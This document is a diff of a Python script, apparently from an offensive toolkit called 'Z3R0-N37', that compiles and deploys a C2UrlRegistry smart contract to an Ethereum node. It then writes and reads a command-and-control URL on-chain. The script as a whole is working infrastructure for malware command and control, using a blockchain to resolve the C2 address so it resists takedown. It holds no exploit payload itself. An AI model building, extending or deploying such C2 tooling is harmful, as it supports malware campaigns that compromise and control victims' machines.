@@ -1,3 +1,10 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Z3R0-N37 blockchain utility — Geth + Clef Sepolia integration
+Author: Z3R0
+Purpose: compile, deploy, and interact with the C2UrlRegistry.sol contract
+"""
 
 import json
 import logging
@@ -5,229 +12,133 @@ import os
 import uuid
 from pathlib import Path
 from typing import Dict, Optional
-
-import solcx
-from solcx import compile_source
+from solcx import install_solc, set_solc_version, compile_source
 from web3 import Web3
 
-try:
-    from web3 import EthereumTesterProvider
-except ImportError:  # pragma: no cover - optional dependency
-    EthereumTesterProvider = None  # type: ignore
+# ──────────────────────────────────────────────────────────────────────────────
+# CONFIGURATION
+# ──────────────────────────────────────────────────────────────────────────────
+C2_RPC_URL = "http://127.0.0.1:7545"  # Local Geth + Clef RPC
+C2_ACCOUNT = "0xDC1f9e5d73dCf36e599669e20c8A46B87821Fc9a"
+SOLC_VERSION = "0.8.20"
+LOCAL_META_FILE = Path("contract_meta.json")
+CONTRACT_FILE = Path("C2UrlRegistry.sol")
 
-solcx.install_solc('0.8.20')
-solcx.set_solc_version('0.8.20')
-
+# ──────────────────────────────────────────────────────────────────────────────
+# INITIAL SETUP
+# ──────────────────────────────────────────────────────────────────────────────
+install_solc(SOLC_VERSION)
+set_solc_version(SOLC_VERSION)
 logger = logging.getLogger(__name__)
+logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
 
-DEFAULT_BLOCKCHAIN_URL = "http://127.0.0.1:7545"
-BLOCKCHAIN_URL_ENV = "C2_BLOCKCHAIN_URL"
-LOCAL_STATE_FILE = Path(__file__).resolve().with_name(".local_c2_registry.json")
-LOCAL_CONTRACT_ADDRESS = "0xLOCALC2REGISTRY"
-
-
-class _LocalCall:
-    def __init__(self, fn):
-        self._fn = fn
-
-    def call(self):
-        return self._fn()
-
-
-class _LocalTransact:
-    def __init__(self, fn):
-        self._fn = fn
-
-    def transact(self, tx_params=None):
-        return self._fn(tx_params)
-
-
-class _LocalContractFunctions:
-    def __init__(self, contract: "LocalContract"):
-        self._contract = contract
-
-    def setC2Url(self, new_url: str):
-        def _commit(_tx_params=None):
-            self._contract.web3._set_state(self._contract.address, "c2_url", new_url)
-            tx_hash = f"local-tx-{uuid.uuid4().hex}"
-            self._contract.web3._last_tx_receipt = {"contractAddress": self._contract.address, "status": 1}
-            return tx_hash
-        return _LocalTransact(_commit)
-
-    def getC2Url(self):
-        return _LocalCall(lambda: self._contract.web3._get_state(self._contract.address, "c2_url"))
-
-
-class _LocalContractConstructor:
-    def __init__(self, contract: "LocalContract"):
-        self._contract = contract
-
-    def transact(self, tx_params=None):
-        address = self._contract.web3._register_contract()
-        self._contract.address = address
-        tx_hash = f"local-deploy-{uuid.uuid4().hex}"
-        self._contract.web3._last_tx_receipt = {"contractAddress": address, "status": 1}
-        return tx_hash
-
-
-class LocalContract:
-    def __init__(self, web3: "LocalWeb3", address: Optional[str] = None):
-        self.web3 = web3
-        self.address = address or LOCAL_CONTRACT_ADDRESS
-        self.functions = _LocalContractFunctions(self)
-
-    def constructor(self):
-        return _LocalContractConstructor(self)
-
-
-class LocalEth:
-    def __init__(self, web3: "LocalWeb3"):
-        self.web3 = web3
-        self.accounts = ["0xLOCALACCOUNT000000000000000000000000000000"]
-        self.default_account = self.accounts[0]
-
-    def contract(self, abi=None, bytecode=None, address=None):
-        return LocalContract(self.web3, address=address or LOCAL_CONTRACT_ADDRESS)
-
-    def wait_for_transaction_receipt(self, tx_hash):
-        return getattr(self.web3, "_last_tx_receipt", {"status": 1, "transactionHash": tx_hash})
-
-
-class LocalWeb3:
-    def __init__(self, state_path: Path):
-        self._state_path = state_path
-        self._state: Dict[str, Dict[str, str]] = self._load_state()
-        self._last_tx_receipt = None
-        self.eth = LocalEth(self)
-
-    def _load_state(self) -> Dict[str, Dict[str, str]]:
-        if self._state_path.exists():
-            try:
-                with self._state_path.open('r', encoding='utf-8') as fh:
-                    return json.load(fh)
-            except Exception:
-                logger.warning("Failed to load local blockchain state; starting fresh.")
-        return {}
-
-    def _persist(self) -> None:
-        try:
-            with self._state_path.open('w', encoding='utf-8') as fh:
-                json.dump(self._state, fh, indent=2)
-        except Exception:
-            logger.exception("Failed to persist local blockchain state.")
-
-    def _register_contract(self) -> str:
-        address = LOCAL_CONTRACT_ADDRESS
-        self._state.setdefault(address, {})
-        self._persist()
-        return address
-
-    def _set_state(self, address: str, key: str, value: str) -> None:
-        self._state.setdefault(address, {})[key] = value
-        self._persist()
-
-    def _get_state(self, address: str, key: str):
-        return self._state.get(address, {}).get(key)
-
-
-def _local_web3() -> LocalWeb3:
-    logger.info("Using local JSON-backed blockchain stub.")
-    return LocalWeb3(LOCAL_STATE_FILE)
-
-
-def _is_connected(w3: Web3) -> bool:
-    if hasattr(w3, "is_connected"):
-        return w3.is_connected()  # type: ignore[attr-defined]
-    return w3.isConnected()
-
-
-def _prime_default_account(w3: Web3) -> None:
+# ──────────────────────────────────────────────────────────────────────────────
+# CORE CONNECTION UTILITIES
+# ──────────────────────────────────────────────────────────────────────────────
+def get_web3() -> Web3:
+    print(f"🔗 Connecting to blockchain at {C2_RPC_URL} ...")
+    w3 = Web3(Web3.HTTPProvider(C2_RPC_URL))
+    if not w3.is_connected():
+        raise ConnectionError("❌ Could not connect to Geth RPC at 7545.")
+    print(f"✅ Connected to {w3.client_version}")
+    w3.eth.default_account = C2_ACCOUNT
+    print(f"Using default account: {C2_ACCOUNT}")
     try:
-        accounts = w3.eth.accounts
-    except Exception:  # pragma: no cover - provider dependent
-        return
-    if accounts:
-        w3.eth.default_account = accounts[0]
+        bal = w3.eth.get_balance(C2_ACCOUNT)
+        print(f"Account balance: {w3.from_wei(bal, 'ether')} ETH")
+    except Exception:
+        print("⚠️  Unable to fetch account balance (possibly not funded yet).")
+    return w3
 
-
-def get_web3(preferred_url: Optional[str] = None) -> Web3:
-    """
-    Return a Web3 instance, preferring the configured HTTP endpoint and falling
-    back to an in-memory Ethereum tester when the endpoint is unavailable.
-    """
-    http_url = preferred_url or os.environ.get(BLOCKCHAIN_URL_ENV, DEFAULT_BLOCKCHAIN_URL)
-    provider = Web3.HTTPProvider(http_url, request_kwargs={"timeout": 5})
-    w3 = Web3(provider)
-
-    try:
-        if _is_connected(w3):
-            logger.debug("Connected to blockchain at %s", http_url)
-            _prime_default_account(w3)
-            return w3
-        logger.warning("Blockchain endpoint %s unreachable; attempting tester fallback.", http_url)
-    except Exception as exc:
-        logger.warning("Failed connecting to %s (%s); attempting tester fallback.", http_url, exc)
-
-    if EthereumTesterProvider is None:
-        return _local_web3()
-
-    try:
-        tester_w3 = Web3(EthereumTesterProvider())
-    except Exception as exc:  # pragma: no cover - provider dependent
-        logger.warning("Failed to initialise Ethereum tester backend (%s); using local stub.", exc)
-        return _local_web3()
-
-    logger.info("Using in-memory Ethereum tester backend for blockchain interactions.")
-    _prime_default_account(tester_w3)
-    return tester_w3
-
-
-def compile_contract(solidity_source):
-    compiled_sol = compile_source(solidity_source)
-    contract_id, contract_interface = compiled_sol.popitem()
-    return contract_interface
-
-
-def deploy_contract(w3, contract_interface):
-    contract = w3.eth.contract(
-        abi=contract_interface['abi'],
-        bytecode=contract_interface['bin']
+# ──────────────────────────────────────────────────────────────────────────────
+# CONTRACT COMPILATION / DEPLOYMENT
+# ──────────────────────────────────────────────────────────────────────────────
+def compile_contract(source_code: str) -> dict:
+    print("🧩 Compiling Solidity contract (London EVM target)...")
+    compiled = compile_source(
+        source_code,
+        output_values=["abi", "bin"],
+        solc_version="0.8.20",
+        evm_version="london"   # 👈 Add this line
     )
-    tx_hash = contract.constructor().transact({'from': w3.eth.accounts[0]})
+    _, interface = compiled.popitem()
+    print("✅ Compilation successful.")
+    return interface
+
+
+
+def deploy_contract(w3: Web3, contract_interface: dict) -> str:
+    print("🚀 Deploying smart contract ...")
+    contract = w3.eth.contract(
+        abi=contract_interface["abi"],
+        bytecode=contract_interface["bin"]
+    )
+    tx_hash = contract.constructor().transact({"from": C2_ACCOUNT})
+    print(f"⏳ Waiting for transaction receipt: {tx_hash.hex()}")
     tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
-    contract_address = getattr(tx_receipt, "contractAddress", None)
-    if contract_address is None and isinstance(tx_receipt, dict):
-        contract_address = tx_receipt.get("contractAddress")
-    if not contract_address:
-        raise RuntimeError("Failed to obtain contract address from deployment receipt.")
-    return contract_address
+    if not tx_receipt or not tx_receipt.contractAddress:
+        raise RuntimeError("❌ Deployment failed or no contract address returned.")
+    address = tx_receipt.contractAddress
+    print(f"✅ Contract deployed at: {address}")
+    return address
 
 
-def get_contract_instance(w3, contract_address, contract_abi):
-    return w3.eth.contract(address=contract_address, abi=contract_abi)
+def save_contract_metadata(address: str, abi: dict) -> None:
+    data = {"address": address, "abi": abi}
+    LOCAL_META_FILE.write_text(json.dumps(data, indent=2))
+    print(f"💾 Saved metadata → {LOCAL_META_FILE}")
 
 
-def set_c2_url(contract_instance, w3, new_url):
-    tx_hash = contract_instance.functions.setC2Url(new_url).transact({'from': w3.eth.accounts[0]})
+def load_contract_metadata() -> Optional[dict]:
+    if not LOCAL_META_FILE.exists():
+        print("⚠️  contract_meta.json not found.")
+        return None
+    return json.loads(LOCAL_META_FILE.read_text())
+
+
+def get_contract_instance(w3: Web3, address: str, abi: dict):
+    return w3.eth.contract(address=address, abi=abi)
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# CONTRACT INTERACTIONS
+# ──────────────────────────────────────────────────────────────────────────────
+def set_c2_url(contract_instance, w3, new_url: str):
+    print(f"🌐 Setting C2 URL → {new_url}")
+    tx_hash = contract_instance.functions.setC2Url(new_url).transact({"from": C2_ACCOUNT})
     w3.eth.wait_for_transaction_receipt(tx_hash)
+    print("✅ C2 URL updated on-chain.")
 
 
-def get_c2_url(contract_instance):
-    return contract_instance.functions.getC2Url().call()
+def get_c2_url(contract_instance) -> str:
+    print("🔍 Fetching current C2 URL ...")
+    try:
+        url = contract_instance.functions.getC2Url().call()
+        print(f"Current C2 URL: {url}")
+        return url
+    except Exception as e:
+        print(f"❌ Failed to read C2 URL: {e}")
+        return ""
 
 
-if __name__ == '__main__':
-    with open('C2UrlRegistry.sol', 'r') as f:
-        solidity_source = f.read()
+# ──────────────────────────────────────────────────────────────────────────────
+# MAIN EXECUTION
+# ──────────────────────────────────────────────────────────────────────────────
+def main():
+    try:
+        if not CONTRACT_FILE.exists():
+            raise FileNotFoundError(f"❌ Missing Solidity file: {CONTRACT_FILE}")
 
-    web3_instance = get_web3()
-    contract_interface = compile_contract(solidity_source)
-    contract_address = deploy_contract(web3_instance, contract_interface)
+        solidity_code = CONTRACT_FILE.read_text()
+        w3 = get_web3()
+        contract_interface = compile_contract(solidity_code)
+        contract_addr = deploy_contract(w3, contract_interface)
+        save_contract_metadata(contract_addr, contract_interface["abi"])
+        print("✅ Deployment complete and metadata written.")
+    except Exception as e:
+        print(f"❌ Error: {e}")
 
-    print(f"Contract deployed at: {contract_address}")
 
-    with open('contract_meta.json', 'w') as f:
-        json.dump({
-            'address': contract_address,
-            'abi': contract_interface['abi']
-        }, f)
+if __name__ == "__main__":
+    main()
+
